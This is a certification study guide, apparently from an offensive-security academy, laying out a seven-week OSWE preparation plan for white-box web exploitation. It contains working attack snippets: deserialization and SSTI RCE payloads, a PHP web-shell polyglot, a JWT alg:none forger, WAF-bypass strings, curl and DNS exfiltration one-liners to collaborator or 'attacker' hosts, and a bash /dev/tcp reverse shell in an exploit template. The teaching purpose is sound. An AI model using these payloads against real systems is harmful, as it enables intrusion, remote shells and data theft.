---
layout: training-page
title: "OSWE Preparation Path — Red Team Academy"
module: "Learning Paths"
tags:
  - oswe
  - learning-path
  - certification
  - web-pentesting
  - code-review
  - source-code-analysis
page_key: "learning-paths-oswe-prep"
render_with_liquid: false
---

# OSWE Preparation Path — 7 Weeks

The Offensive Security Web Expert (OSWE) certification, awarded after the AWAE course (Advanced Web Attacks and Exploitation), is OffSec's flagship white-box web application certification. It is fundamentally different from OSCP: instead of throwing payloads at black-box targets, you are given the application's source code and expected to read it, understand it, and chain together vulnerabilities into a working unauthenticated remote-code-execution exploit script.

This path prepares you for the 48-hour exam by building source-code-review fluency in the language families that dominate the exam — PHP, Java, .NET, Node.js, and Python — and by teaching the exploit-chain patterns OffSec consistently tests. It assumes you are comfortable with the web vulnerabilities at OSCP level (SQLi, basic XSS, basic SSRF) and have written code in at least one language professionally.

---

## OSWE Exam Overview

| Parameter | Detail |
|---|---|
| Duration | 47 hours 45 minutes exam + 24 hours report |
| Machines | 2 web applications, each requiring source-code review |
| Scoring | 50 pts per machine (35 auth bypass + 15 RCE), 200 pts total |
| Pass threshold | 85 / 100 (must fully exploit at least one machine and partially exploit the other) |
| Allowed tools | Any (no Metasploit auto-exploit, no other automated frameworks for the exploit) |
| Report format | Professional PDF including working exploit scripts |
| Source code | Provided for both target applications |

The exam tests four core competencies:

1. **Source code auditing** — reading the application top-down, mapping routes to controllers to data access, identifying sinks and tainted sources
2. **Authentication bypass** — chaining a logic flaw, an injection, or a deserialization bug into a session for any user (usually admin)
3. **Remote code execution** — chaining a second vulnerability post-auth that yields shell on the underlying server
4. **Exploit scripting** — producing a single Python script (`exploit.py`) that, given target IP and your callback IP, performs the full chain end-to-end with zero manual steps

Auth bypass is worth more than RCE on each machine. Many candidates fail because they treat the exploit as a one-off proof-of-concept rather than an unattended automation that must work on the first run during grading.

---

## Prerequisites Checklist

Before starting week 1, verify you can:

- [ ] Read code fluently in at least one of: PHP, Java, C#, JavaScript/Node, Python
- [ ] Write a 100-line Python script that handles HTTP requests, sessions, and regex parsing
- [ ] Identify standard web vulnerabilities (SQLi, XSS, SSRF, file upload) in a black-box context
- [ ] Use Burp Suite Pro confidently — repeater, intruder, comparer, search-in-history
- [ ] Set up a debugger for at least one server-side language (Xdebug, IntelliJ Java debugger, dnSpy, Node `--inspect`, pdb)
- [ ] Understand HTTP at the byte level — chunked encoding, multipart, CRLF, Content-Type vs body parsing

If two or more boxes above are unchecked, do four weeks of PortSwigger Web Security Academy and write a small CRUD web app in your weakest language family before beginning.

---

## The Mental Shift: Black-Box to White-Box

Most candidates coming from OSCP or bug bounty hit a wall in the first week of AWAE because their reflexes are wrong. Internalize the differences before you start studying:

| Black-box mindset (OSCP / Bug Bounty) | White-box mindset (OSWE) |
|---|---|
| Fuzz a parameter and watch the response | Trace the parameter through the code to its sink |
| Try every payload from a cheatsheet | Read the sanitization function, find the bypass |
| Confirm a vuln by triggering a known signature | Confirm a vuln by understanding the unsafe code path |
| Move on if a payload does not work | Read the controller; the payload was filtered for reason X — bypass X |
| Find one bug, exploit it, finish | Find two bugs, chain them, automate them |

The single biggest force multiplier on the exam is **route mapping**: spending the first 60–90 minutes reading the application's router, controller layer, and authentication middleware before testing a single request. Resist the urge to start fuzzing.

---

## Week 1: Web Application Architecture and Source Code Auditing

**Goal:** Build the cognitive scaffolding for reading server-side code top-down across multiple frameworks, and learn to identify dangerous sinks at a glance.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/web-architecture](/web/web-architecture) | MVC, routing, middleware, ORM, template engines, session stores |
| [/web/source-code-review](/web/source-code-review) | Top-down audit methodology, route map, sink-first vs source-first approaches |
| [/web/dangerous-sinks](/web/dangerous-sinks) | Cross-language catalog of dangerous functions and their exploit primitives |
| [/web/bug-bounty-methodology](/web/bug-bounty-methodology) | Triage workflow, request annotation, working note conventions |

### Top-Down Audit Methodology

When you sit down with a new application, do these in order. Do not skip steps to "save time" — every step you skip is a vulnerability you will not find.

```
1. INVENTORY            — Read the README, package manifest, build files. What stack is this?
2. ROUTE MAP            — List every public route, every authenticated route, every admin route.
3. AUTH MIDDLEWARE      — Read the authentication and authorization filters. Where can they be bypassed?
4. SESSION HANDLING     — How are sessions created, stored, validated, invalidated? Where is the secret?
5. INPUT POINTS         — For each route, list the parameters and where they end up.
6. SINK CATALOG         — Grep for dangerous functions. Trace each one back to its caller.
7. TRUST BOUNDARIES     — Where does untrusted input cross a trust boundary? That is where vulnerabilities live.
8. CHAINS               — Can a vulnerability in route X give me what I need to exploit route Y?
```

### Cross-Language Dangerous Sink Quick Reference

| Vulnerability | PHP | Java | .NET | Node.js | Python |
|---|---|---|---|---|---|
| RCE (eval) | `eval`, `assert`, `preg_replace /e` | `Runtime.exec`, `ScriptEngine.eval` | `Process.Start`, `CSharpCodeProvider` | `eval`, `Function()`, `vm.run*` | `eval`, `exec`, `subprocess shell=True` |
| Deserialization | `unserialize` | `ObjectInputStream.readObject`, `XMLDecoder` | `BinaryFormatter`, `JSON.NET TypeNameHandling: All` | `node-serialize`, prototype pollution | `pickle.loads`, `yaml.load` (unsafe) |
| SQLi | `mysqli_query` with concat | `Statement.execute*` vs `PreparedStatement` | `SqlCommand` string concat | raw queries in `mysql`, `pg`, Sequelize | string concat into `cursor.execute` |
| SSRF | `file_get_contents`, `curl_exec` | `URL.openConnection`, `RestTemplate` | `WebClient`, `HttpClient.GetAsync` | `http.get`, `axios`, `node-fetch` | `requests`, `urllib.request.urlopen` |
| XXE | `simplexml_load_string` (libxml < 2.9) | `DocumentBuilder`/`SAXParser` defaults | `XmlDocument` w/ `XmlResolver != null` | `libxmljs`, `xml2js` with DTD | `lxml.etree.parse` w/ `resolve_entities=True` |
| Path traversal | `include`, `require`, `file_get_contents` | `new File(userPath)` | `File.ReadAllText`, `Server.MapPath` | `fs.readFile` w/o normalize | `open(userPath)` w/o `abspath` check |

Memorize this table. On the exam you will jump between two unknown applications in unknown languages — the ability to grep for the right tokens within 30 seconds is the difference between finishing and failing.

### Tooling Setup

```bash
# Code search with ripgrep
sudo apt install ripgrep
rg --type php  "unserialize\("                /path/to/app
rg --type java "Runtime\.getRuntime\(\)\.exec" /path/to/app

# IDE — VS Code with Intelephense (PHP), Extension Pack for Java (or IntelliJ),
# C# Dev Kit + dnSpyEx (.NET), built-in TS + ESLint (Node), Pylance (Python).

# Diff two versions to find what a security patch changed
diff -r /path/to/app-vuln /path/to/app-patched
```

### Practice Targets

- **HTB Sense** — basic source code review on pfSense diagnostic_command.php
- **HTB Magic** — file upload bypass + LFI chain, common AWAE pattern
- **PortSwigger Web Academy** — "Web LLM attacks" and "API testing" labs (good cross-training)
- **Hack The Box "Code Review"** track — direct OSWE practice

---

## Week 2: PHP Application Auditing

**Goal:** Become fluent at auditing PHP applications, the most common exam language. Find authentication bypasses via type juggling and SQL injection, and find RCE via unserialize chains and file upload abuse.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/php-source-review](/web/php-source-review) | PHP-specific audit methodology, type juggling, magic methods, autoload chains |
| [/web/php-deserialization](/web/php-deserialization) | PHP unserialize, magic methods, phpggc, gadget chain construction |
| [/web/sql-injection](/web/sql-injection) | Blind boolean SQLi, time-based extraction, second-order SQLi, sqlmap as a checker only |
| [/web/file-upload](/web/file-upload) | Extension bypass, content-type bypass, .htaccess upload, polyglot files |

### PHP Authentication Bypass Patterns

```php
// Pattern 1: Type juggling with ==
if ($_POST['password'] == $expected) { ... }
// "0e1234" == "0e5678" → true (both parse as 0.0)
// "1234" == 1234 → true (string-to-int coercion)

// Pattern 2: strcmp returning NULL for arrays (older PHP)
if (strcmp($_POST['password'], $expected) === 0) { ... }
// Send password[]=anything — strcmp returns NULL, NULL == 0 is true

// Pattern 3: in_array loose comparison
if (in_array($id, $admin_ids)) { ... }   // default strict=false
// in_array("1abc", [1, 2, 3]) → true

// Pattern 4: SQL injection in login (the OSWE classic)
$query = "SELECT * FROM users WHERE email='" . $_POST['email'] . "' AND password=...";
// Inject: ' OR (SELECT 1 FROM users WHERE email='admin' AND SUBSTRING(password,1,1)='a') -- -
```

### PHP Deserialization Chain Construction

```php
// 1. Find entry: unserialize($_COOKIE['session']); unserialize(base64_decode($_POST['data']));
// 2. Inventory classes:  rg "^class " --type php /path/to/app  — Composer vendor classes count.
// 3. Magic methods to chain through:
//    __destruct (best — always fires), __wakeup (on unserialize), __toString (on cast),
//    __call (undefined method), __get/__set (property access)
// 4. phpggc for known frameworks:
//    phpggc Laravel/RCE6 "id" -b
//    phpggc Symfony/RCE1 "id" -b
//    phpggc Monolog/RCE1 "id" -b
```

### Practice Targets

- **AtMail Workgroup Server 7.8.0.4** — historical AWAE target, full PHP audit
- **HTB SecNotes / Magic / Networked** — file upload PHP RCE patterns
- **PortSwigger "Insecure deserialization" labs** — PHP magic method chains

---

## Week 3: Java and .NET Application Auditing

**Goal:** Apply the same audit methodology to compiled and JVM-based applications. Reverse compiled bytecode back to readable source, recognize framework-specific deserialization sinks, and exploit them with `ysoserial` and `ysoserial.net`.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/java-source-review](/web/java-source-review) | Spring/JAX-RS/Servlet routing, Java audit methodology, JNDI sinks |
| [/web/java-deserialization](/web/java-deserialization) | ysoserial, gadget chains, JNDI injection, marshalsec |
| [/web/dotnet-source-review](/web/dotnet-source-review) | ASP.NET routing, MVC controllers, deserialization sinks, dnSpy workflow |
| [/web/dotnet-deserialization](/web/dotnet-deserialization) | ysoserial.net, ObjectStateFormatter, JSON.NET TypeNameHandling abuse |

### Source from Bytecode

OffSec routinely provides applications as compiled JARs or DLLs and expects you to decompile and audit them as if you had source. Set up your decompilation toolchain in week 3 — do not save it for the exam.

```bash
# Java JAR/WAR — CFR is the recommended decompiler; Procyon and jd-gui are backups.
# IntelliJ IDEA opens a JAR as a project and decompiles on the fly.
java -jar cfr-0.152.jar target.jar --outputdir decompiled/

# .NET DLL/EXE — ILSpy (cross-platform), dnSpyEx (Windows, edit IL + debugger), dotPeek.
ilspycmd target.dll --project --outputdir decompiled/
```

### Recognizing Java and .NET Deserialization Sinks

```java
// Java — classic ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();              // RCE if classpath has a gadget

// XMLDecoder — full RCE primitive, no gadget needed
XMLDecoder decoder = new XMLDecoder(request.getInputStream());

// SnakeYAML (non-safe loader) and JNDI lookup (log4shell primitive)
new Yaml().load(request.getInputStream());
new InitialContext().lookup(userControlledString);   // LDAP/RMI gadget
```

```csharp
// .NET BinaryFormatter
object obj = new BinaryFormatter().Deserialize(stream);     // ysoserial.net

// JSON.NET with TypeNameHandling != None — payload "$type" → arbitrary type
var obj = JsonConvert.DeserializeObject(json,
    new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });

// ASP.NET ViewState — leaked MachineKey → RCE via crafted __VIEWSTATE
```

### Generating Gadgets

```bash
# Java
java -jar ysoserial-all.jar CommonsCollections5 "curl http://attacker/x" > payload.bin
java -jar ysoserial-all.jar Spring1 "id" | base64 -w0

# .NET
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe" --minify
```

### Practice Targets

- **HTB Schooled** — Java Moodle plugin audit
- **HTB Forge** — Java SSRF chain
- **OSWE-style: Atutor 2.2.1** — Java + LMS audit (historical AWAE target)
- **HTB Sniper** — .NET RFI/deserialization
- **HTB Bankrobber** — .NET source review

---

## Week 4: Node.js and Python Application Auditing

**Goal:** Cover the remaining language families that appear on the exam. Find prototype pollution, template injection, and async race conditions in Node, and find pickle deserialization, SSTI, and unsafe eval in Python.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/node-source-review](/web/node-source-review) | Express/Koa routing, middleware order, prototype pollution, eval sinks |
| [/web/nodejs-deserialization](/web/nodejs-deserialization) | node-serialize, prototype pollution to RCE, vm escape |
| [/web/python-source-review](/web/python-source-review) | Flask/Django/FastAPI audit, pickle, yaml.load, SSTI |
| [/web/template-injection](/web/template-injection) | SSTI by engine — Jinja2, Twig, Freemarker, Velocity, Handlebars |

### Node.js Prototype Pollution Chain

```javascript
// 1. Find a merge/extend/assign that walks user keys without filtering __proto__
function merge(target, source) {
  for (let k in source) {
    if (typeof source[k] === 'object') merge(target[k], source[k]);
    else target[k] = source[k];      // pollution sink
  }
}
// 2. Pollute Object.prototype with body {"__proto__": {"isAdmin": true}}.
//    Now every empty object reads .isAdmin === true.
// 3. Pick a gadget that reads the polluted property: Pug/Handlebars compile
//    options, child_process.exec env/shell flag, lodash.template, EJS render.
//    Example Pug RCE: {"__proto__": {"block": {"type": "Text", "line": "alert(1)"}}}
```

### Python Deserialization and SSTI

```python
# pickle — RCE primitive, no gadget search needed
import pickle
class Exploit:
    def __reduce__(self): return (__import__('os').system, ('id',))
pickle.dumps(Exploit())     # anywhere pickle.loads(user_input) appears → RCE

# yaml.load (non-safe) — same idea
import yaml
yaml.load("!!python/object/apply:os.system ['id']", Loader=yaml.Loader)

# Jinja2 SSTI (Flask) — indicator: {{ 7*7 }} renders 49
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Async Race Conditions

```javascript
// TOCTOU on resource state during an async DB call
app.post('/withdraw', async (req, res) => {
  const user = await db.user.findById(req.session.userId);
  if (user.balance >= req.body.amount) {       // check
    await sleep(50);                            // any await between check and use
    await db.user.update(user.id, {balance: user.balance - req.body.amount});
  }
});
// Fire 50 parallel withdrawals → balance goes negative.
// Burp Suite "Turbo Intruder" with gate-and-release is the standard tool.
```

### Practice Targets

- **HTB Postman / Cap / Knife** — Node.js source review
- **HTB Sink** — Node + AWS + SSRF chain
- **HTB Doctor** — Flask SSTI
- **HTB Backend** — FastAPI / JWT audit
- **PortSwigger "Server-side template injection" labs**

---

## Week 5: Advanced Web Vulnerability Classes

**Goal:** Master the high-yield vulnerability classes that AWAE consistently tests but rarely appear in OSCP — blind SSRF, blind RCE, second-order injection, and authentication chains.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/blind-ssrf](/web/blind-ssrf) | Detection via Burp Collaborator, internal port scanning, cloud metadata, gopher protocol |
| [/web/blind-rce](/web/blind-rce) | OAST-based detection, time-based extraction, stdout exfiltration |
| [/web/second-order-injection](/web/second-order-injection) | Stored payloads triggered by separate request, profile-to-search SQLi |
| [/web/auth-bypass](/web/auth-bypass) | JWT abuse, SAML manipulation, session fixation, password reset poisoning |
| [/web/http-smuggling](/web/http-smuggling) | CL.TE, TE.CL, TE.TE, HTTP/2 downgrade smuggling |
| [/web/xxe](/web/xxe) | OOB XXE via external DTD, blind XXE, parameter entities |

### Blind SSRF Methodology

```
1. Identify the sink — URL fetcher (?url=, ?image=, ?webhook=), importer, PDF generator, avatar
2. Confirm with OAST — point at http://<your-interactsh>/, watch DNS/HTTP hits
3. Map internal surface — iterate localhost ports via Burp Intruder, watch response length
4. Cloud metadata — AWS 169.254.169.254/latest/meta-data/iam/security-credentials/,
   GCP /computeMetadata/v1/ (header Metadata-Flavor: Google), Azure /metadata/instance (Metadata: true)
5. Filter bypass — DNS rebinding (Singularity), decimal/hex IP encoding,
   redirect bypass (your server 302s to 127.0.0.1), URL parser confusion (http://expected.com@127.0.0.1/)
```

### Blind RCE Extraction

```bash
# OAST when egress is allowed
;curl http://<your-collab>/$(whoami)

# DNS-only when egress is restricted
;nslookup $(whoami).<your-collab>
;dig $(id|base64|tr -d '\n').<your-collab>

# Time-based when there is no egress at all
;[ $(whoami|head -c1) = r ] && sleep 5

# Side channel — write output to a file the app serves
;id > /var/www/html/uploads/out.txt && curl http://target/uploads/out.txt
```

### Exam-Style Exploit Chain Template

The OSWE exam expects a single `exploit.py` that takes target IP and callback IP, performs auth bypass, then performs RCE, then drops a shell. The structure below is what graders are looking for:

```python
#!/usr/bin/env python3
import requests, argparse
from urllib.parse import urljoin

class Exploit:
    def __init__(self, target, lhost, lport):
        self.s = requests.Session(); self.s.verify = False
        self.target = target.rstrip('/'); self.lhost = lhost; self.lport = lport

    def auth_bypass(self):
        # ... exploit code ...
        r = self.s.get(urljoin(self.target, '/admin/dashboard'))
        assert 'Dashboard' in r.text, "Auth bypass failed"
        print('[+] Authenticated as admin')

    def rce(self, command):
        # ... exploit code ... returns command output
        return output

    def shell(self):
        self.rce(f'bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"')
        print(f'[+] Reverse shell sent to {self.lhost}:{self.lport}')

    def run(self):
        self.auth_bypass(); self.shell()

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True)
    p.add_argument('--lhost',  required=True)
    p.add_argument('--lport',  default='4444')
    a = p.parse_args()
    Exploit(a.target, a.lhost, a.lport).run()
```

Test by reverting the target VM, rebooting it, and running the script against the fresh image. If any step requires manual intervention — a copy-pasted token, a hand-edited cookie — fix it before the exam.

---

## Week 6: Putting It Together — Full Chains and Custom Payload Development

**Goal:** Stop studying individual vulnerabilities and start building exploits that chain three or four primitives into a working unauthenticated RCE.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/exploit-chain-design](/web/exploit-chain-design) | Modeling a chain as a graph of primitives, finding the shortest path to admin shell |
| [/web/custom-payload-development](/web/custom-payload-development) | Generating polyglots, encoding for the target context, sidestepping WAF rules |
| [/exploit-dev/python-exploit-scripting](/exploit-dev/python-exploit-scripting) | requests Session reuse, multipart, CSRF token handling, follow-on requests |

### The Chain Graph

Every OSWE machine can be modeled as a directed graph where nodes are application states and edges are vulnerabilities you can exercise to move between states. A typical chain:

```
[unauthenticated] → password reset token leak (info disclosure)
[arbitrary user session] → IDOR on role field (broken access control)
[admin session] → unsafe eval in admin scripts (RCE primitive)
[code execution on server] → reverse shell → [interactive shell]
```

Draw this graph on paper for every practice target before writing the exploit. The exam favors hunters who can see the whole chain before they write a line of code.

### WAF and Filter Bypass — the Common Tricks

| Filter | Bypass technique |
|---|---|
| Blocks `union select` | `uNiOn/**/SeLect`, `UNION%0aSELECT`, `UNION/*!50000SELECT*/` |
| Blocks `'` (single quote) | `0x...` hex literals, or backslash escape into a numeric column |
| Blocks `script` tag | `<svg/onload=...>`, `<img src=x onerror=...>`, `<details ontoggle=...>` |
| Strips `..` / spaces | `..%2f`, `....//`, `%09`, `%0a`, `/**/`, `+` |
| Blocks `/etc/passwd` | `/etc//passwd`, symlinks, `php://filter/read=...` |
| Blocks `bash`/`sh` | `b\ash`, `${IFS}`, brace expansion, `$@` |

### Custom Payload Generation

```python
# PHP polyglot upload (passes image check, runs as PHP)
open('shell.gif.php', 'wb').write(b'GIF89a;<?php system($_GET["c"]); ?>')

# JWT with alg:none
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
print(f"{h.decode()}.{p.decode()}.")
```

### Practice Targets

- **OffSec AWAE Extra Mile exercises** — if you have the course, do every one of them
- **Vulhub** — full Docker images of CVE-vulnerable applications, perfect for end-to-end practice
- **HTB OSWE-like list** (community-curated): Schooled, Sink, Forge, Cereal, Bankrobber, Brainfuck, Magic, Sense, Networked
- **PortSwigger Web Academy "Advanced topics"** — all of them

---

## Week 7: Mock Exam, Exploit Polishing, and Report Writing

**Goal:** Run a full 48-hour simulation under exam conditions, then produce a professional report with working exploit scripts.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/reporting/findings](/reporting/findings) | Finding documentation, evidence quality, severity scoring |
| [/reporting/oswe-report-template](/reporting/oswe-report-template) | OSWE-specific report structure, exploit script appendix, code annotations |

### Mock Exam Protocol

Pick two AWAE-style applications you have not seen before (rotate community lists; do not reuse the practice targets from week 6). For each, simulate exam conditions:

- Set a 48-hour timer, no breaks longer than 6 hours
- No external write-ups, no AI assistance, no walkthroughs
- Goal: auth bypass + RCE on both, with a single self-contained Python exploit per machine
- Document every command and every code reference as you go — do not save it for the report

If you cannot produce one complete chain in 48 hours on the mock, do another full week of practice targets before booking the real exam.

### Exploit Polish Checklist

Before submitting, your `exploit.py` for each machine must:

- [ ] Take target IP, callback IP, and callback port as arguments — no hardcoded values
- [ ] Run end-to-end with zero manual steps (no copy-paste of tokens, no manual cookie editing)
- [ ] Verify success at each stage (assert auth worked before attempting RCE)
- [ ] Print informative status messages with `[+]` / `[-]` / `[*]` prefixes
- [ ] Catch obvious failure modes (target unreachable, response unexpected) and exit cleanly
- [ ] Work on a fresh-reverted target VM, not one you have already poked
- [ ] Survive a `python3 exploit.py --target ... --lhost ... --lport ...` invocation by a tired grader at 2 a.m.

### Report Standards

OffSec is strict on OSWE reports. Each machine section must include:

1. **Executive Summary** — one paragraph, non-technical
2. **Vulnerability 1 (Auth Bypass)**
   - Code listing showing the vulnerable function, with line numbers, from the provided source
   - One-paragraph explanation of why the code is vulnerable
   - Step-by-step exploitation walkthrough with request/response screenshots
   - The exploit code segment that triggers it, syntax-highlighted
3. **Vulnerability 2 (RCE)** — same structure
4. **Full Exploit Script** — `exploit.py`, complete, in a code block
5. **Proof Files** — screenshots of `proof.txt` from each machine, with IP visible
6. **Remediation Recommendations** — per vulnerability, written for the developer who will fix it

### Exam Strategy and Time Allocation

| Time Block | Activity |
|---|---|
| Hour 0–2 | Read both READMEs, set up source in IDE, draw route map for both apps |
| Hour 2–14 | Auth bypass on machine 1 (highest value, do it while fresh) |
| Hour 14–22 | RCE on machine 1, then polish exploit script |
| Hour 22–24 | Sleep — non-negotiable |
| Hour 24–40 | Auth bypass + RCE on machine 2 |
| Hour 40–46 | Polish exploit script 2, screenshots, verify both proof files |
| Hour 46–48 | Buffer for stuck-step recovery |

**Never spend more than 4 hours stuck on a single vulnerability.** Switch machines. The fresh perspective on the second app routinely unblocks the first. Sleep is not optional — sleep-deprived candidates miss the obvious chain in front of them.

---

## Certification Mapping — What OSWE Validates

| Skill | OSCP | OSWE |
|---|---|---|
| Black-box service exploitation | Heavy | Light |
| Source code review | Light | Heavy |
| Authentication bypass via logic flaws | Light | Heavy |
| Custom exploit script development | Light | Heavy |
| Active Directory | Heavy | None |
| Privilege escalation | Heavy | Light (post-RCE only) |
| Web vulnerability identification | Medium | Heavy |
| Deserialization attacks | None | Heavy |
| Report writing with exploit code | Light | Heavy |

OSWE is the natural follow-up to OSCP for hunters who want to specialize in application security. Combined with OSEP (evasion + AD) and OSED (binary exploit dev), the three form OffSec's OSCE3 — the practical equivalent of a top-tier offensive security résumé line.

---

## Lab Recommendations

| Lab | What it gives you | Cost |
|---|---|---|
| OffSec AWAE official labs | The exam-aligned source set, mandatory | Paid (required for exam) |
| Hack The Box "Code Review" track | Curated white-box machines | HTB subscription |
| PentesterLab Pro | Structured web vulnerability labs with source | Paid (excellent value) |
| PortSwigger Web Security Academy | Free, the deepest free web security curriculum | Free |
| Vulhub | Local Docker images of CVE-vulnerable apps | Free |
| TryHackMe "Web Fundamentals" + "OWASP Top 10" rooms | Pre-AWAE warmup | Free / Paid |
| GitHub: foospidy/payloads | Payload reference for filter-bypass practice | Free |
| GitHub: swisskyrepo/PayloadsAllTheThings | The canonical exploitation reference | Free |

---

## Additional Resources

| Resource | Type | Why |
|---|---|---|
| PortSwigger Research Blog | Articles | Original research on advanced web attacks |
| Orange Tsai blog | Articles | World-class chain construction case studies |
| Sam Curry blog | Articles | Real-world auth bypass + IDOR write-ups |
| OWASP Top 10 + ASVS | Reference | Vocabulary and severity framework |
| Real World Web Hacking (Yaworski) | Book | Bug bounty methodology applied to OSWE mindset |
| The Web Application Hacker's Handbook | Book | Dated but still the foundational reference |
| Black Hat / DEF CON / OffensiveCon talks | Video | Novel chains that show up months later in OSWE labs |
